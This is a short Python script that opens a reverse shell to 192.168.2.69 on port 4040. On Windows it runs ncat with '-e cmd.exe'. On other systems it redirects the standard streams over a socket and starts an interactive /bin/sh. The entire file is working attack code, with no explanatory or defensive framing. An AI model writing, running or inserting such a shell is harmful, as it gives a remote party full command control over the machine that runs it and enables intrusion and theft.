import socket,subprocess,os,platform

def get_os():
    return platform.system();  

if(get_os() == "Windows"):
    script = "ncat 192.168.2.69 4040 -e cmd.exe"; 
    subprocess.run(script, shell=True);
else:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); 
    s.connect(("192.168.2.69",4040));

    os.dup2(s.fileno(),0);
    os.dup2(s.fileno(),1);
    os.dup2(s.fileno(),2);

    p=subprocess.call(["/bin/sh","-i"]);
